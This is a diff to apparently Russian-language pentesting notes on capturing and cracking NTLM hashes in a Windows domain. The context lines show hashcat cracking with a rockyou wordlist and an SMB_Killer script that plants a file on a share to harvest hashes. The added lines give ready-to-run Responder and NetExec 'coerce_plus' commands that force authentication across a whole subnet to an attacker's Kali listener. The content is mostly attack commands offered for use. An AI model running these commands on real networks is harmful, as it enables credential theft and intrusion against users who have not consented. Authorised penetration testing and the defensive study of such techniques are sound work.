@@ -14,3 +14,8 @@ hashcat granon-hash.txt /usr/share/wordlist/rockyou2024.txt
 2 способ
 https://github.com/overgrowncarrot1/SMB_Killer
 python3 SMB_killer.py -r remote_ip -l ip_kali -d domain.local -i tun0 -a Share -U '' -P '' -A   скрипт поднимает responder записывает файл в шару, если на файл кто-то переходит получаем хэши
+
+
+3 принудительная аутентификация (перехват хэшей)
+sudo responder -I eth0
+nxc smb 192.168.0.0/24 -u user -p 'password' -M coerce_plus -o LISTENER=ip_kali   
